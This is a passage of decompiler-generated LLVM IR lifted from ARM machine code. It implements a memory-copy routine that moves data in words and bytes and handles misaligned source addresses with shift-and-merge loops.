  %v4_1753c = inttoptr i32 %v3_1753c to i32*
  %v5_1753c = load i32, i32* %v4_1753c, align 4
  store i32 %v5_1753c, i32* %r3.global-to-local, align 4
  %v6_1753c = add i32 %v3_1753c, 4
  %v7_1753c = inttoptr i32 %v6_1753c to i32*
  %v8_1753c = load i32, i32* %v7_1753c, align 4
  store i32 %v8_1753c, i32* @ip, align 4
  %v9_1753c = add i32 %v3_1753c, 8
  %v10_1753c = inttoptr i32 %v9_1753c to i32*
  %v11_1753c = load i32, i32* %v10_1753c, align 4
  store i32 %v11_1753c, i32* @lr, align 4
  %v12_1753c = add i32 %v3_1753c, 12
  store i32 %v12_1753c, i32* @r1, align 4
  %v4_17540 = inttoptr i32 %v3_17540 to i32*
  store i32 %v5_1753c, i32* %v4_17540, align 4
  %v6_17540 = add i32 %v3_17540, 4
  %v7_17540 = inttoptr i32 %v6_17540 to i32*
  %v8_17540 = load i32, i32* @ip, align 4
  store i32 %v8_17540, i32* %v7_17540, align 4
  %v9_17540 = add i32 %v3_17540, 8
  %v10_17540 = inttoptr i32 %v9_17540 to i32*
  %v11_17540 = load i32, i32* @lr, align 4
  store i32 %v11_17540, i32* %v10_17540, align 4
  %v12_17540 = add i32 %v3_17540, 12
  store i32 %v12_17540, i32* %r0.global-to-local, align 4
  %v3_17544 = load i32, i32* %r2.global-to-local, align 4
  %v4_17544 = add i32 %v3_17544, -12
  store i32 %v4_17544, i32* %r2.global-to-local, align 4
  %v6_17544 = sub i32 11, %v3_17544
  %v7_17544 = and i32 %v6_17544, %v3_17544
  %v8_17544 = icmp slt i32 %v7_17544, 0
  store i1 %v8_17544, i1* %cpsr_v.global-to-local, align 1
  %v9_17544 = icmp slt i32 %v4_17544, 0
  store i1 %v9_17544, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_1753c, %bb130
  %v0_1754c.pre = phi i32 [ %v4_17544, %bb130 ], [ %v0_1754c.pre148, %dec_label_pc_1753c ]
  %v3_1754098118 = phi i32 [ %v12_17540, %bb130 ], [ %v3_17540, %dec_label_pc_1753c ]
  %v1_17548 = phi i1 [ %v8_17544, %bb130 ], [ %v1_17544, %dec_label_pc_1753c ]
  %v0_17548 = phi i1 [ %v9_17544, %bb130 ], [ %v0_17544, %dec_label_pc_1753c ]
  %v2_17548 = xor i1 %v1_17548, %v0_17548
  br i1 %v2_17548, label %dec_label_pc_1754c, label %dec_label_pc_1753c

dec_label_pc_1754c:                               ; preds = %.thread117, %dec_label_pc_174f8
  %v7_1755c = phi i32 [ %v0_1751092, %dec_label_pc_174f8 ], [ %v3_1754098118, %.thread117 ]
  %v0_1754c = phi i32 [ %v2_174f8, %dec_label_pc_174f8 ], [ %v0_1754c.pre, %.thread117 ]
  %v2_1754c = add i32 %v0_1754c, 8
  store i32 %v2_1754c, i32* %r2.global-to-local, align 4
  %v4_1754c = sub i32 0, %v0_1754c
  %v5_1754c = and i32 %v2_1754c, %v4_1754c
  %v6_1754c = icmp slt i32 %v5_1754c, 0
  store i1 %v6_1754c, i1* %cpsr_v.global-to-local, align 1
  %v7_1754c = icmp slt i32 %v2_1754c, 0
  store i1 %v7_1754c, i1* %cpsr_n.global-to-local, align 1
  %v5_17550 = icmp slt i32 %v0_1754c, -8
  br i1 %v5_17550, label %bb132, label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %dec_label_pc_1754c
  %v6_17554 = add i32 %v0_1754c, 4
  store i32 %v6_17554, i32* %r2.global-to-local, align 4
  %v8_17554 = sub i32 -5, %v0_1754c
  %v9_17554 = and i32 %v8_17554, %v2_1754c
  %v10_17554 = icmp slt i32 %v9_17554, 0
  store i1 %v10_17554, i1* %cpsr_v.global-to-local, align 1
  %v11_17554 = icmp slt i32 %v6_17554, 0
  store i1 %v11_17554, i1* %cpsr_n.global-to-local, align 1
  %v5_17558 = icmp slt i32 %v2_1754c, 4
  %v6_17558 = load i32, i32* @r1, align 4
  %v7_17558 = inttoptr i32 %v6_17558 to i32*
  %v8_17558 = load i32, i32* %v7_17558, align 4
  store i32 %v8_17558, i32* %r3.global-to-local, align 4
  %v10_17558 = add i32 %v6_17558, 4
  br i1 %v5_17558, label %.thread5, label %bb131

.thread5:                                         ; preds = %dec_label_pc_17554
  store i32 %v10_17558, i32* @r1, align 4
  %v8_1755c = inttoptr i32 %v7_1755c to i32*
  store i32 %v8_17558, i32* %v8_1755c, align 4
  %v9_1755c = load i32, i32* %r0.global-to-local, align 4
  %v10_1755c = add i32 %v9_1755c, 4
  store i32 %v10_1755c, i32* %r0.global-to-local, align 4
  %v0_1756c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb132

bb131:                                            ; preds = %dec_label_pc_17554
  %v10_17560 = inttoptr i32 %v10_17558 to i32*
  %v11_17560 = load i32, i32* %v10_17560, align 4
  store i32 %v11_17560, i32* @ip, align 4
  %v12_17560 = add i32 %v6_17558, 8
  store i32 %v12_17560, i32* @r1, align 4
  %v7_17564 = inttoptr i32 %v7_1755c to i32*
  store i32 %v8_17558, i32* %v7_17564, align 4
  %v9_17564 = add i32 %v7_1755c, 4
  %v10_17564 = inttoptr i32 %v9_17564 to i32*
  %v11_17564 = load i32, i32* @ip, align 4
  store i32 %v11_17564, i32* %v10_17564, align 4
  %v12_17564 = add i32 %v7_1755c, 8
  store i32 %v12_17564, i32* %r0.global-to-local, align 4
  %v6_17568 = load i32, i32* %r2.global-to-local, align 4
  %v7_17568 = add i32 %v6_17568, -4
  store i32 %v7_17568, i32* %r2.global-to-local, align 4
  br label %bb132

bb132:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_1754c, %bb, %dec_label_pc_17714, %dec_label_pc_1763c, %dec_label_pc_176a8, %bb131
  %v2_1757c = phi i32 [ %v10_1755c, %.thread5 ], [ %v0_1760c75, %.thread11 ], [ %v7_1755c, %dec_label_pc_1754c ], [ %v1_174d0, %bb ], [ %v2_1757c113, %dec_label_pc_17714 ], [ %v2_1757c112, %dec_label_pc_1763c ], [ %v2_1757c111, %dec_label_pc_176a8 ], [ %v12_17564, %bb131 ]
  %v0_1756c = phi i32 [ %v0_1756c.pre, %.thread5 ], [ %v2_175b4, %.thread11 ], [ %v2_1754c, %dec_label_pc_1754c ], [ %v2_174e0, %bb ], [ %v0_1756c109, %dec_label_pc_17714 ], [ %v0_1756c108, %dec_label_pc_1763c ], [ %v0_1756c107, %dec_label_pc_176a8 ], [ %v7_17568, %bb131 ]
  %v1_1756c = add i32 %v0_1756c, 4
  store i32 %v1_1756c, i32* @r2, align 4
  %v3_1756c = sub i32 0, %v0_1756c
  %v4_1756c = and i32 %v1_1756c, %v3_1756c
  %v5_1756c = icmp slt i32 %v4_1756c, 0
  store i1 %v5_1756c, i1* %cpsr_v.global-to-local, align 1
  %v6_1756c = icmp slt i32 %v1_1756c, 0
  store i1 %v6_1756c, i1* %cpsr_n.global-to-local, align 1
  %v7_1756c = icmp eq i32 %v1_1756c, 0
  store i1 %v7_1756c, i1* @cpsr_z, align 1
  br i1 %v7_1756c, label %bb133, label %bb134

bb133:                                            ; preds = %bb132
  %v3_17570 = load i8*, i8** %stack_var_-8, align 4
  %v4_17570 = ptrtoint i8* %v3_17570 to i32
  store i32 %v4_17570, i32* %r0.global-to-local, align 4
  ret i32 %v4_17570

bb134:                                            ; preds = %bb132
  %v1_17574 = add i32 %v0_1756c, 2
  %v3_17574 = sub i32 -3, %v0_1756c
  %v4_17574 = and i32 %v3_17574, %v1_1756c
  %v5_17574 = icmp slt i32 %v4_17574, 0
  store i1 %v5_17574, i1* %cpsr_v.global-to-local, align 1
  %v6_17574 = icmp slt i32 %v1_17574, 0
  store i1 %v6_17574, i1* %cpsr_n.global-to-local, align 1
  %v7_17574 = icmp eq i32 %v1_1756c, 2
  store i1 %v7_17574, i1* @cpsr_z, align 1
  %v0_17578 = load i32, i32* @r1, align 4
  %v1_17578 = inttoptr i32 %v0_17578 to i8*
  %v2_17578 = load i8, i8* %v1_17578, align 1
  %v3_17578 = zext i8 %v2_17578 to i32
  store i32 %v3_17578, i32* %r3.global-to-local, align 4
  %v5_17578 = add i32 %v0_17578, 1
  store i32 %v5_17578, i32* @r1, align 4
  %v3_1757c = inttoptr i32 %v2_1757c to i8*
  store i8 %v2_17578, i8* %v3_1757c, align 1
  %v4_1757c = load i32, i32* %r0.global-to-local, align 4
  %v5_1757c = add i32 %v4_1757c, 1
  store i32 %v5_1757c, i32* %r0.global-to-local, align 4
  %v0_17580 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17580 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17580 = xor i1 %v0_17580, %v1_17580
  br i1 %v2_17580, label %.thread119, label %bb135

bb135:                                            ; preds = %bb134
  %v3_17580 = load i32, i32* @r1, align 4
  %v4_17580 = inttoptr i32 %v3_17580 to i8*
  %v5_17580 = load i8, i8* %v4_17580, align 1
  %v6_17580 = zext i8 %v5_17580 to i32
  store i32 %v6_17580, i32* %r3.global-to-local, align 4
  %v8_17580 = add i32 %v3_17580, 1
  store i32 %v8_17580, i32* @r1, align 4
  %v6_17584 = inttoptr i32 %v5_1757c to i8*
  store i8 %v5_17580, i8* %v6_17584, align 1
  %v7_17584 = load i32, i32* %r0.global-to-local, align 4
  %v8_17584 = add i32 %v7_17584, 1
  store i32 %v8_17584, i32* %r0.global-to-local, align 4
  %v1_17588.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17588.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb134, %bb135
  %v7_1758c = phi i32 [ %v8_17584, %bb135 ], [ %v5_1757c, %bb134 ]
  %v2_1758c = phi i1 [ %v2_17588.pre, %bb135 ], [ %v1_17580, %bb134 ]
  %v1_1758c = phi i1 [ %v1_17588.pre, %bb135 ], [ %v0_17580, %bb134 ]
  %v0_17588 = load i1, i1* @cpsr_z, align 1
  %v3_17588 = xor i1 %v2_1758c, %v1_1758c
  %v4_17588 = or i1 %v0_17588, %v3_17588
  br i1 %v4_17588, label %.thread120, label %bb136

bb136:                                            ; preds = %.thread119
  %v5_17588 = load i32, i32* @r1, align 4
  %v6_17588 = inttoptr i32 %v5_17588 to i8*
  %v7_17588 = load i8, i8* %v6_17588, align 1
  %v8_17588 = zext i8 %v7_17588 to i32
  store i32 %v8_17588, i32* %r3.global-to-local, align 4
  %v10_17588 = add i32 %v5_17588, 1
  store i32 %v10_17588, i32* @r1, align 4
  %v8_1758c = inttoptr i32 %v7_1758c to i8*
  store i8 %v7_17588, i8* %v8_1758c, align 1
  %v9_1758c = load i32, i32* %r0.global-to-local, align 4
  %v10_1758c = add i32 %v9_1758c, 1
  store i32 %v10_1758c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb136
  %v2_17590 = load i8*, i8** %stack_var_-8, align 4
  %v3_17590 = ptrtoint i8* %v2_17590 to i32
  store i32 %v3_17590, i32* %r0.global-to-local, align 4
  ret i32 %v3_17590

dec_label_pc_17594:                               ; preds = %dec_label_pc_174e8
  %v1_17594 = sub nsw i32 4, %v1_174e8
  store i32 %v1_17594, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17598 = icmp ult i32 %v1_17594, 2
  store i1 %v8_17598, i1* %cpsr_n.global-to-local, align 1
  %v1_1759c = inttoptr i32 %v0_174d0 to i8*
  %v2_1759c = load i8, i8* %v1_1759c, align 1
  %v3_1759c = zext i8 %v2_1759c to i32
  store i32 %v3_1759c, i32* %r3.global-to-local, align 4
  %v5_1759c = add i32 %v0_174d0, 1
  store i32 %v5_1759c, i32* @r1, align 4
  store i8 %v2_1759c, i8* %v5_174dc, align 1
  %v4_175a0 = load i32, i32* %r0.global-to-local, align 4
  %v5_175a0 = add i32 %v4_175a0, 1
  store i32 %v5_175a0, i32* %r0.global-to-local, align 4
  br i1 %v8_17598, label %.thread11, label %bb137

bb137:                                            ; preds = %dec_label_pc_17594
  %v9_17598 = icmp eq i32 %v1_17594, 2
  %v6_175a4 = load i32, i32* @r1, align 4
  %v7_175a4 = inttoptr i32 %v6_175a4 to i8*
  %v8_175a4 = load i8, i8* %v7_175a4, align 1
  %v9_175a4 = zext i8 %v8_175a4 to i32
  store i32 %v9_175a4, i32* %r3.global-to-local, align 4
  %v11_175a4 = add i32 %v6_175a4, 1
  store i32 %v11_175a4, i32* @r1, align 4
  %v9_175a8 = inttoptr i32 %v5_175a0 to i8*
  store i8 %v8_175a4, i8* %v9_175a8, align 1
  %v10_175a8 = load i32, i32* %r0.global-to-local, align 4
  %v11_175a8 = add i32 %v10_175a8, 1
  store i32 %v11_175a8, i32* %r0.global-to-local, align 4
  br i1 %v9_17598, label %.thread11, label %bb138

bb138:                                            ; preds = %bb137
  %v8_175ac = load i32, i32* @r1, align 4
  %v9_175ac = inttoptr i32 %v8_175ac to i8*
  %v10_175ac = load i8, i8* %v9_175ac, align 1
  %v11_175ac = zext i8 %v10_175ac to i32
  store i32 %v11_175ac, i32* %r3.global-to-local, align 4
  %v13_175ac = add i32 %v8_175ac, 1
  store i32 %v13_175ac, i32* @r1, align 4
  %v11_175b0 = inttoptr i32 %v11_175a8 to i8*
  store i8 %v10_175ac, i8* %v11_175b0, align 1
  %v12_175b0 = load i32, i32* %r0.global-to-local, align 4
  %v13_175b0 = add i32 %v12_175b0, 1
  store i32 %v13_175b0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb137, %dec_label_pc_17594, %bb138
  %v0_1760c75 = phi i32 [ %v11_175a8, %bb137 ], [ %v5_175a0, %dec_label_pc_17594 ], [ %v13_175b0, %bb138 ]
  %v0_175b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_175b4 = load i32, i32* @ip, align 4
  %v2_175b4 = sub i32 %v0_175b4, %v1_175b4
  store i32 %v2_175b4, i32* %r2.global-to-local, align 4
  %v4_175b4 = xor i32 %v1_175b4, %v0_175b4
  %v5_175b4 = xor i32 %v2_175b4, %v0_175b4
  %v6_175b4 = and i32 %v5_175b4, %v4_175b4
  %v7_175b4 = icmp slt i32 %v6_175b4, 0
  store i1 %v7_175b4, i1* %cpsr_v.global-to-local, align 1
  %v8_175b4 = icmp slt i32 %v2_175b4, 0
  store i1 %v8_175b4, i1* %cpsr_n.global-to-local, align 1
  %v5_175b8 = icmp slt i32 %v0_175b4, %v1_175b4
  br i1 %v5_175b8, label %bb132, label %dec_label_pc_175bc

dec_label_pc_175bc:                               ; preds = %.thread11
  %v0_175bc = load i32, i32* @r1, align 4
  %v1_175bc = urem i32 %v0_175bc, 4
  store i32 %v1_175bc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175bc = icmp eq i32 %v1_175bc, 0
  %extract.t123 = trunc i32 %v0_175bc to i2
  br i1 %v2_175bc, label %dec_label_pc_174f8, label %dec_label_pc_175c4

dec_label_pc_175c4:                               ; preds = %dec_label_pc_174f0, %dec_label_pc_175bc
  %v0_1760c74 = phi i32 [ %v1_174d0, %dec_label_pc_174f0 ], [ %v0_1760c75, %dec_label_pc_175bc ]
  %v0_176b8 = phi i32 [ %v2_174e0, %dec_label_pc_174f0 ], [ %v2_175b4, %dec_label_pc_175bc ]
  %v0_175cc.off0 = phi i2 [ %extract.t, %dec_label_pc_174f0 ], [ %extract.t123, %dec_label_pc_175bc ]
  %v0_175c4 = phi i32 [ %v0_174d0, %dec_label_pc_174f0 ], [ %v0_175bc, %dec_label_pc_175bc ]
  %v1_175c4 = and i32 %v0_175c4, -4
  store i32 %v1_175c4, i32* %r1.global-to-local, align 4
  %v1_175c8 = inttoptr i32 %v1_175c4 to i32*
  %v2_175c8 = load i32, i32* %v1_175c8, align 4
  store i32 %v2_175c8, i32* @lr, align 4
  %v4_175c8 = add i32 %v1_175c4, 4
  store i32 %v4_175c8, i32* %r1.global-to-local, align 4
  %v2_176b0 = add i32 %v0_176b8, -12
  %v4_176b0 = sub i32 11, %v0_176b8
  %v5_176b0 = and i32 %v4_176b0, %v0_176b8
  %v6_176b0 = icmp slt i32 %v5_176b0, 0
  store i1 %v6_176b0, i1* %cpsr_v.global-to-local, align 1
  %v7_176b0 = icmp slt i32 %v2_176b0, 0
  store i1 %v7_176b0, i1* %cpsr_n.global-to-local, align 1
  %v5_176b4 = icmp slt i32 %v0_176b8, 12
  switch i2 %v0_175cc.off0, label %dec_label_pc_175d8 [
    i2 -1, label %dec_label_pc_176b0
    i2 -2, label %dec_label_pc_17644
  ]

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175c4
  br i1 %v5_176b4, label %dec_label_pc_17624, label %dec_label_pc_175e0

dec_label_pc_175e0:                               ; preds = %dec_label_pc_175d8
  store i32 %v2_176b0, i32* %r2.global-to-local, align 4
  %v3_175e4 = load i32, i32* @r4, align 4
  store i32 %v3_175e4, i32* %stack_var_-16, align 4
  %v6_175e4 = load i32, i32* @r5, align 4
  store i32 %v6_175e4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge, %dec_label_pc_175e0
  %v0_1760c = phi i32 [ %v12_1760c, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge ], [ %v0_1760c74, %dec_label_pc_175e0 ]
  %v0_175ec = phi i32 [ %v0_175ec.pre, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge ], [ %v4_175c8, %dec_label_pc_175e0 ]
  %v0_175e8 = phi i32 [ %v0_175e8.pre, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge ], [ %v2_175c8, %dec_label_pc_175e0 ]
  %v3_175e8 = udiv i32 %v0_175e8, 256
  store i32 %v3_175e8, i32* %r3.global-to-local, align 4
  %v1_175ec = inttoptr i32 %v0_175ec to i32*
  %v2_175ec = load i32, i32* %v1_175ec, align 4
  store i32 %v2_175ec, i32* %r4.global-to-local, align 4
  %v3_175ec = add i32 %v0_175ec, 4
  %v4_175ec = inttoptr i32 %v3_175ec to i32*
  %v5_175ec = load i32, i32* %v4_175ec, align 4
  store i32 %v5_175ec, i32* %r5.global-to-local, align 4
  %v6_175ec = add i32 %v0_175ec, 8
  %v7_175ec = inttoptr i32 %v6_175ec to i32*
  %v8_175ec = load i32, i32* %v7_175ec, align 4
  store i32 %v8_175ec, i32* %ip.global-to-local, align 4
  %v9_175ec = add i32 %v0_175ec, 12
  %v10_175ec = inttoptr i32 %v9_175ec to i32*
  %v11_175ec = load i32, i32* %v10_175ec, align 4
  store i32 %v11_175ec, i32* @lr, align 4
  %v12_175ec = add i32 %v0_175ec, 16
  store i32 %v12_175ec, i32* %r1.global-to-local, align 4
  %v4_175f0 = mul i32 %v2_175ec, 16777216
  %v5_175f0 = or i32 %v4_175f0, %v3_175e8
  store i32 %v5_175f0, i32* %r3.global-to-local, align 4
  %v3_175f4 = udiv i32 %v2_175ec, 256
  %v4_175f8 = mul i32 %v5_175ec, 16777216
  %v5_175f8 = or i32 %v4_175f8, %v3_175f4
  store i32 %v5_175f8, i32* %r4.global-to-local, align 4
  %v3_175fc = udiv i32 %v5_175ec, 256
  %v4_17600 = mul i32 %v8_175ec, 16777216
  %v5_17600 = or i32 %v4_17600, %v3_175fc
  store i32 %v5_17600, i32* %r5.global-to-local, align 4
  %v3_17604 = udiv i32 %v8_175ec, 256
  %v4_17608 = mul i32 %v11_175ec, 16777216
  %v5_17608 = or i32 %v4_17608, %v3_17604
  store i32 %v5_17608, i32* @ip, align 4
  %v1_1760c = inttoptr i32 %v0_1760c to i32*
  store i32 %v5_175f0, i32* %v1_1760c, align 4
  %v3_1760c = add i32 %v0_1760c, 4
  %v4_1760c = inttoptr i32 %v3_1760c to i32*
  %v5_1760c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1760c, i32* %v4_1760c, align 4
  %v6_1760c = add i32 %v0_1760c, 8
  %v7_1760c = inttoptr i32 %v6_1760c to i32*
  %v8_1760c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1760c, i32* %v7_1760c, align 4
  %v9_1760c = add i32 %v0_1760c, 12
  %v10_1760c = inttoptr i32 %v9_1760c to i32*
  %v11_1760c = load i32, i32* @ip, align 4
  store i32 %v11_1760c, i32* %v10_1760c, align 4
  %v12_1760c = add i32 %v0_1760c, 16
  store i32 %v12_1760c, i32* %r0.global-to-local, align 4
  %v0_17610 = load i32, i32* %r2.global-to-local, align 4
  %v2_17610 = add i32 %v0_17610, -16
  store i32 %v2_17610, i32* %r2.global-to-local, align 4
  %v6_17614 = icmp slt i32 %v0_17610, 16
  br i1 %v6_17614, label %dec_label_pc_17618, label %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge

dec_label_pc_175e8.dec_label_pc_175e8_crit_edge:  ; preds = %dec_label_pc_175e8
  %v0_175e8.pre = load i32, i32* @lr, align 4
  %v0_175ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175e8

dec_label_pc_17618:                               ; preds = %dec_label_pc_175e8
  %v2_17618 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17618, i32* @r4, align 4
  %v5_17618 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17618, i32* @r5, align 4
  %v2_1761c = add i32 %v0_17610, -4
  store i32 %v2_1761c, i32* %r2.global-to-local, align 4
  %v4_1761c = add i32 %v0_17610, 2147483632
  %v5_1761c = and i32 %v2_1761c, %v4_1761c
  %v6_1761c = icmp slt i32 %v5_1761c, 0
  store i1 %v6_1761c, i1* %cpsr_v.global-to-local, align 1
  %v7_1761c = icmp slt i32 %v2_1761c, 0
  store i1 %v7_1761c, i1* %cpsr_n.global-to-local, align 1
  %v5_17620 = icmp slt i32 %v2_17610, -12
  br i1 %v5_17620, label %dec_label_pc_1763c, label %dec_label_pc_17624

dec_label_pc_17624:                               ; preds = %dec_label_pc_17618, %dec_label_pc_175d8, %dec_label_pc_17624
  %v1_17630 = phi i32 [ %v4_17630, %dec_label_pc_17624 ], [ %v12_1760c, %dec_label_pc_17618 ], [ %v0_1760c74, %dec_label_pc_175d8 ]
  %v0_17624 = load i32, i32* @lr, align 4
  %v3_17624 = udiv i32 %v0_17624, 256
  store i32 %v3_17624, i32* %ip.global-to-local, align 4
  %v0_17628 = load i32, i32* %r1.global-to-local, align 4
  %v1_17628 = inttoptr i32 %v0_17628 to i32*
  %v2_17628 = load i32, i32* %v1_17628, align 4
  store i32 %v2_17628, i32* @lr, align 4
  %v4_17628 = add i32 %v0_17628, 4
  store i32 %v4_17628, i32* %r1.global-to-local, align 4
  %v4_1762c = mul i32 %v2_17628, 16777216
  %v5_1762c = or i32 %v4_1762c, %v3_17624
  store i32 %v5_1762c, i32* @ip, align 4
  %v2_17630 = inttoptr i32 %v1_17630 to i32*
  store i32 %v5_1762c, i32* %v2_17630, align 4
  %v3_17630 = load i32, i32* %r0.global-to-local, align 4
  %v4_17630 = add i32 %v3_17630, 4
  store i32 %v4_17630, i32* %r0.global-to-local, align 4
  %v0_17634 = load i32, i32* %r2.global-to-local, align 4
  %v2_17634 = add i32 %v0_17634, -4
  store i32 %v2_17634, i32* %r2.global-to-local, align 4
  %v6_17638 = icmp slt i32 %v0_17634, 4
  br i1 %v6_17638, label %dec_label_pc_1763c.loopexit, label %dec_label_pc_17624

dec_label_pc_1763c.loopexit:                      ; preds = %dec_label_pc_17624
  %v4_17634 = sub i32 3, %v0_17634
  %v5_17634 = and i32 %v4_17634, %v0_17634
  %v6_17634 = icmp slt i32 %v5_17634, 0
  %v7_17634 = icmp slt i32 %v2_17634, 0
  store i1 %v6_17634, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17634, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1763c

dec_label_pc_1763c:                               ; preds = %dec_label_pc_1763c.loopexit, %dec_label_pc_17618
  %v2_1757c112 = phi i32 [ %v4_17630, %dec_label_pc_1763c.loopexit ], [ %v12_1760c, %dec_label_pc_17618 ]
  %v0_1756c108 = phi i32 [ %v2_17634, %dec_label_pc_1763c.loopexit ], [ %v2_1761c, %dec_label_pc_17618 ]
  %v0_1763c = load i32, i32* %r1.global-to-local, align 4
  %v1_1763c = add i32 %v0_1763c, -3
  store i32 %v1_1763c, i32* @r1, align 4
  br label %bb132

dec_label_pc_17644:                               ; preds = %dec_label_pc_175c4
  br i1 %v5_176b4, label %dec_label_pc_17690, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17644
  store i32 %v2_176b0, i32* %r2.global-to-local, align 4
  %v3_17650 = load i32, i32* @r4, align 4
  store i32 %v3_17650, i32* %stack_var_-16, align 4
  %v6_17650 = load i32, i32* @r5, align 4
  store i32 %v6_17650, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17654

dec_label_pc_17654:                               ; preds = %dec_label_pc_17654.dec_label_pc_17654_crit_edge, %dec_label_pc_1764c
  %v0_17678 = phi i32 [ %v12_17678, %dec_label_pc_17654.dec_label_pc_17654_crit_edge ], [ %v0_1760c74, %dec_label_pc_1764c ]
  %v0_17658 = phi i32 [ %v0_17658.pre, %dec_label_pc_17654.dec_label_pc_17654_crit_edge ], [ %v4_175c8, %dec_label_pc_1764c ]
  %v0_17654 = phi i32 [ %v0_17654.pre, %dec_label_pc_17654.dec_label_pc_17654_crit_edge ], [ %v2_175c8, %dec_label_pc_1764c ]
  %v3_17654 = udiv i32 %v0_17654, 65536
  store i32 %v3_17654, i32* %r3.global-to-local, align 4
  %v1_17658 = inttoptr i32 %v0_17658 to i32*
  %v2_17658 = load i32, i32* %v1_17658, align 4
  store i32 %v2_17658, i32* %r4.global-to-local, align 4
  %v3_17658 = add i32 %v0_17658, 4
  %v4_17658 = inttoptr i32 %v3_17658 to i32*
  %v5_17658 = load i32, i32* %v4_17658, align 4
  store i32 %v5_17658, i32* %r5.global-to-local, align 4
  %v6_17658 = add i32 %v0_17658, 8
  %v7_17658 = inttoptr i32 %v6_17658 to i32*
  %v8_17658 = load i32, i32* %v7_17658, align 4
  store i32 %v8_17658, i32* %ip.global-to-local, align 4
  %v9_17658 = add i32 %v0_17658, 12
  %v10_17658 = inttoptr i32 %v9_17658 to i32*
  %v11_17658 = load i32, i32* %v10_17658, align 4
  store i32 %v11_17658, i32* @lr, align 4
  %v12_17658 = add i32 %v0_17658, 16
  store i32 %v12_17658, i32* %r1.global-to-local, align 4
  %v4_1765c = mul i32 %v2_17658, 65536
  %v5_1765c = or i32 %v4_1765c, %v3_17654
  store i32 %v5_1765c, i32* %r3.global-to-local, align 4
  %v3_17660 = udiv i32 %v2_17658, 65536
  %v4_17664 = mul i32 %v5_17658, 65536
  %v5_17664 = or i32 %v4_17664, %v3_17660
  store i32 %v5_17664, i32* %r4.global-to-local, align 4
  %v3_17668 = udiv i32 %v5_17658, 65536
  %v4_1766c = mul i32 %v8_17658, 65536
  %v5_1766c = or i32 %v4_1766c, %v3_17668
  store i32 %v5_1766c, i32* %r5.global-to-local, align 4
  %v3_17670 = udiv i32 %v8_17658, 65536
  %v4_17674 = mul i32 %v11_17658, 65536
  %v5_17674 = or i32 %v4_17674, %v3_17670
  store i32 %v5_17674, i32* @ip, align 4
  %v1_17678 = inttoptr i32 %v0_17678 to i32*
  store i32 %v5_1765c, i32* %v1_17678, align 4
  %v3_17678 = add i32 %v0_17678, 4
  %v4_17678 = inttoptr i32 %v3_17678 to i32*
  %v5_17678 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17678, i32* %v4_17678, align 4
  %v6_17678 = add i32 %v0_17678, 8
  %v7_17678 = inttoptr i32 %v6_17678 to i32*
  %v8_17678 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17678, i32* %v7_17678, align 4
  %v9_17678 = add i32 %v0_17678, 12
  %v10_17678 = inttoptr i32 %v9_17678 to i32*
  %v11_17678 = load i32, i32* @ip, align 4
  store i32 %v11_17678, i32* %v10_17678, align 4
  %v12_17678 = add i32 %v0_17678, 16
  store i32 %v12_17678, i32* %r0.global-to-local, align 4
  %v0_1767c = load i32, i32* %r2.global-to-local, align 4
  %v2_1767c = add i32 %v0_1767c, -16
  store i32 %v2_1767c, i32* %r2.global-to-local, align 4
  %v6_17680 = icmp slt i32 %v0_1767c, 16
  br i1 %v6_17680, label %dec_label_pc_17684, label %dec_label_pc_17654.dec_label_pc_17654_crit_edge

dec_label_pc_17654.dec_label_pc_17654_crit_edge:  ; preds = %dec_label_pc_17654
  %v0_17654.pre = load i32, i32* @lr, align 4
  %v0_17658.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17654

dec_label_pc_17684:                               ; preds = %dec_label_pc_17654
  %v2_17684 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17684, i32* @r4, align 4
  %v5_17684 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17684, i32* @r5, align 4
  %v2_17688 = add i32 %v0_1767c, -4
  store i32 %v2_17688, i32* %r2.global-to-local, align 4
  %v4_17688 = add i32 %v0_1767c, 2147483632
  %v5_17688 = and i32 %v2_17688, %v4_17688
  %v6_17688 = icmp slt i32 %v5_17688, 0
  store i1 %v6_17688, i1* %cpsr_v.global-to-local, align 1
  %v7_17688 = icmp slt i32 %v2_17688, 0
  store i1 %v7_17688, i1* %cpsr_n.global-to-local, align 1
  %v5_1768c = icmp slt i32 %v2_1767c, -12
  br i1 %v5_1768c, label %dec_label_pc_176a8, label %dec_label_pc_17690

dec_label_pc_17690:                               ; preds = %dec_label_pc_17684, %dec_label_pc_17644, %dec_label_pc_17690
